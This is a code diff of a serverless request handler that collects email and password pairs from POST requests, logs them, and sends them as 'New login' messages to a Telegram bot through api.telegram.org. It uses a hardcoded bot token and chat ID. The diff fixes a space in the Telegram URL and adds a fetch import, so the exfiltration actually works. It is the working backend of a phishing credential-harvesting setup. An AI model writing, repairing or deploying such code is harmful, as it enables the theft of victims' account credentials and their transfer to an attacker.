@@ -1,13 +1,6 @@
+import fetch from 'node-fetch';
+
 export default async function handler(req, res) {
-    // Allow CORS
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-
-    if (req.method === 'OPTIONS') {
-        return res.status(200).end(); // Handle preflight requests
-    }
-
     if (req.method === 'POST') {
         try {
             const { email, password } = req.body;
@@ -16,11 +9,10 @@ export default async function handler(req, res) {
             console.log('Received credentials:', { email, password });
 
             // Send credentials to Telegram bot
-            const telegramBotToken = '7868090234:AAE5y7sRoCWUaCXQIqcgBc_iXlhblq7HWDo';
-            const chatId = '7036500681';
+            const telegramBotToken = '7868090234:AAE5y7sRoCWUaCXQIqcgBc_iXlhblq7HWDo'; // Your Telegram bot token
+            const chatId = '7036500681'; // Your Telegram chat ID
             const message = encodeURIComponent(`New login:\nEmail: ${email}\nPassword: ${password}`);
-            const telegramUrl = `https://api.telegram.org/bot ${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
-
+            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
             console.log('Sending message to Telegram:', telegramUrl);
 
             const response = await fetch(telegramUrl);
